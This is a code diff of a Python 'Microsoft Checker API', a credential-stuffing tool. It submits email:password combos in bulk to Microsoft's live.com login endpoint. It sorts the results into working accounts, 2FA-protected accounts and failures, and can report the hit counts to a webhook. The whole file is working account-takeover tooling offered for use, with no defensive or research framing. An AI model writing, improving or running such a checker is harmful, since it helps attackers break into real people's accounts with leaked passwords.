@@ -3,9 +3,7 @@ import json
 import requests
 import time
 import random
-import yaml
 import os
-from urllib.parse import parse_qs
 
 class MailHub:
     def __init__(self):
@@ -16,67 +14,32 @@ class MailHub:
             "Referer": "https://login.live.com/oauth20_authorize.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&redirect_uri=https%3A%2F%2Faccounts.epicgames.com%2FOAuthAuthorized&state=eyJpZCI6IjAzZDZhYmM1NDIzMjQ2Yjg5MWNhYmM2ODg0ZGNmMGMzIn0%3D&scope=xboxlive.signin&service_entity=undefined&force_verify=true&response_type=code&display=popup",
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
         }
-        self.failMICROSOFT = ["Your account or password is incorrect.", "That Microsoft account doesn\\'t exist. Enter a different account", "Sign in to your Microsoft account", 'Please sign in with a Microsoft account or create a new account']
+        self.failMICROSOFT = ["Your account or password is incorrect.", "That Microsoft account doesn\\'t exist. Enter a different account", "Sign in to your Microsoft account"]
         self.retryMICROSOFT = [",AC:null,urlFedConvertRename", "Too Many Requests"]
-        self.nfaMICROSOFT = ["account.live.com/recover?mkt", "recover?mkt", "account.live.com/identity/confirm?mkt", "Email/Confirm?mkt", "Help us protect your account"]
-        self.customMICROSOFT = ["/cancel?mkt=", "/Abuse?mkt="]
+        self.nfaMICROSOFT = ["account.live.com/recover?mkt", "recover?mkt", "Help us protect your account"]
         self.hitsMICROSOFT = ['sSigninName', 'PPAuth', 'WLSSC', 'name="ANON"']
 
     def found(self, keywords, resp):
-        for keyword in keywords:
-            if keyword in resp:
-                return True
-        return False
+        return any(k in resp for k in keywords)
 
     def payloadMICROSOFT(self, email, password):
         return {
-            "i13": "0",
-            "login": email,
-            "loginfmt": email,
-            "type": "11",
-            "LoginOptions": "3",
-            "lrt": "",
-            "lrtPartition": "",
-            "hisRegion": "",
-            "hisScaleUnit": "",
-            "passwd": password,
-            "ps": "2",
-            "psRNGCDefaultType": "1",
-            "psRNGCEntropy": "",
-            "psRNGCSLK": "-DiygW3nqox0vvJ7dW44rE5gtFMCs15qempbazLM7SFt8rqzFPYiz07lngjQhCSJAvR432cnbv6uaSwnrXQ*RzFyhsGXlLUErzLrdZpblzzJQawycvgHoIN2D6CUMD9qwoIgR*vIcvH3ARmKp1m44JQ6VmC6jLndxQadyaLe8Tb!ZLz59Te6lw6PshEEM54ry8FL2VM6aH5HPUv94uacHz!qunRagNYaNJax7vItu5KjQ",
-            "canary": "",
-            "ctx": "",
-            "hpgrequestid": "",
-            "PPFT": "-DjzN1eKq4VUaibJxOt7gxnW7oAY0R7jEm4DZ2KO3NyQh!VlvUxESE5N3*8O*fHxztUSA7UxqAc*jZ*hb9kvQ2F!iENLKBr0YC3T7a5RxFF7xUXJ7SyhDPND0W3rT1l7jl3pbUIO5v1LpacgUeHVyIRaVxaGUg*bQJSGeVs10gpBZx3SPwGatPXcPCofS!R7P0Q$$",
-            "PPSX": "Passp",
-            "NewUser": "1",
-            "FoundMSAs": "",
-            "fspost": "0",
-            "i21": "0",
-            "CookieDisclosure": "0",
-            "IsFidoSupported": "1",
-            "isSignupPost": "0",
-            "isRecoveryAttemptPost": "0",
-            "i19": "21648"
+            "i13": "0", "login": email, "loginfmt": email, "type": "11", "LoginOptions": "3",
+            "passwd": password, "ps": "2", "NewUser": "1", "fspost": "0", "i21": "0"
         }
 
     def loginMICROSOFT(self, email, password):
-        session = requests.Session()
-        session.headers.update(self.headersMICROSOFT)
-        url = "https://login.live.com/ppsecure/post.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e&contextid=A31E247040285505&opid=F7304AA192830107&bk=1701944501&uaid=a7afddfca5ea44a8a2ee1bba76040b3c&pid=15216"
-        
         try:
-            r = session.post(url, data=self.payloadMICROSOFT(email, password), timeout=15)
+            r = requests.post(
+                "https://login.live.com/ppsecure/post.srf?client_id=82023151-c27d-4fb5-8551-10c10724a55e",
+                headers=self.headersMICROSOFT,
+                data=self.payloadMICROSOFT(email, password),
+                timeout=8
+            )
             if self.found(self.hitsMICROSOFT, r.text):
                 return "HIT"
             if self.found(self.nfaMICROSOFT, r.text):
                 return "2FA"
-            if self.found(self.customMICROSOFT, r.text):
-                return "CUSTOM"
-            if self.found(self.failMICROSOFT, r.text):
-                return "BAD"
-            if self.found(self.retryMICROSOFT, r.text):
-                return "RETRY"
             return "BAD"
         except:
             return "BAD"
@@ -85,65 +48,71 @@ def is_valid_combo(line):
     line = line.strip()
     if not line or ':' not in line or line.count(':') != 1:
         return False
-    email, password = [x.strip() for x in line.split(':', 1)]
     lower = line.lower()
     bad = ['t.me', 'cloud', 'test.com', 'albaniamf', 'validdatabase', "t'h'e", "t;h;e", "skylight"]
-    return not any(b in lower for b in bad) and len(password) < 70
+    return not any(b in lower for b in bad) and len(line.split(':',1)[1]) < 70
 
 class handler(BaseHTTPRequestHandler):
     def do_GET(self):
-        self.send_response(200)
-        self.send_header('Content-type', 'text/html')
-        self.end_headers()
-        self.wfile.write(b"""
-        <h1>ATOOL Microsoft Checker API</h1>
-        <p>POST to this endpoint with JSON body containing "combos" array and optional "webhook".</p>
-        """)
+        if self.path == "/api/stream":
+            self.send_response(200)
+            self.send_header('Content-Type', 'text/event-stream')
+            self.send_header('Cache-Control', 'no-cache')
+            self.send_header('Connection', 'keep-alive')
+            self.end_headers()
+            # Keep connection open for SSE
+            while True:
+                time.sleep(30)
+                try:
+                    self.wfile.write(b"event: ping\ndata: {}\n\n")
+                    self.wfile.flush()
+                except:
+                    break
+        else:
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html')
+            self.end_headers()
+            self.wfile.write(b"ATOOL Microsoft Checker API is running.")
 
     def do_POST(self):
-        try:
-            content_length = int(self.headers.get('Content-Length', 0))
-            post_data = self.rfile.read(content_length)
-            data = json.loads(post_data)
+        if self.path == "/api/check":
+            try:
+                content_length = int(self.headers.get('Content-Length', 0))
+                post_data = self.rfile.read(content_length)
+                data = json.loads(post_data)
 
-            combos = data.get("combos", [])
-            webhook = data.get("webhook")
+                combos = data.get("combos", [])
+                webhook = data.get("webhook")
 
-            if not combos or not isinstance(combos, list):
-                self.send_response(400)
+                valid_combos = [c for c in combos if is_valid_combo(c)]
+                results = {"hits": [], "2fa": [], "bad": [], "total": len(valid_combos)}
+
+                checker = MailHub()
+
+                for i, combo in enumerate(valid_combos, 1):
+                    status = checker.loginMICROSOFT(*combo.split(':', 1))
+                    if status == "HIT":
+                        results["hits"].append(combo)
+                    elif status == "2FA":
+                        results["2fa"].append(combo)
+                    else:
+                        results["bad"].append(combo)
+
+                # Webhook
+                if webhook:
+                    try:
+                        requests.post(webhook, json={
+                            "content": f"**ATOOL Check Finished**\nHits: {len(results['hits'])} | 2FA: {len(results['2fa'])}"
+                        })
+                    except:
+                        pass
+
+                self.send_response(200)
+                self.send_header('Content-type', 'application/json')
                 self.end_headers()
-                self.wfile.write(json.dumps({"error": "combos array is required"}).encode())
-                return
+                self.wfile.write(json.dumps(results).encode())
 
-            valid_combos = [c for c in combos if is_valid_combo(c)]
-            results = {"hits": [], "2fa": [], "bad": [], "total": len(valid_combos)}
-
-            checker = MailHub()
-
-            for combo in valid_combos:
-                status = checker.loginMICROSOFT(*combo.split(':', 1))
-                if status == "HIT":
-                    results["hits"].append(combo)
-                elif status == "2FA":
-                    results["2fa"].append(combo)
-                else:
-                    results["bad"].append(combo)
-
-            # Send webhook if provided
-            if webhook:
-                try:
-                    requests.post(webhook, json={
-                        "content": f"**ATOOL Check Complete**\n✅ Hits: {len(results['hits'])}\n⚠️ 2FA: {len(results['2fa'])}\nTotal: {results['total']}"
-                    }, timeout=10)
-                except:
-                    pass
-
-            self.send_response(200)
-            self.send_header('Content-type', 'application/json')
-            self.end_headers()
-            self.wfile.write(json.dumps(results, indent=2).encode())
-
-        except Exception as e:
-            self.send_response(500)
-            self.end_headers()
-            self.wfile.write(json.dumps({"error": str(e)}).encode())
+            except Exception as e:
+                self.send_response(500)
+                self.end_headers()
+                self.wfile.write(json.dumps({"error": str(e)}).encode())
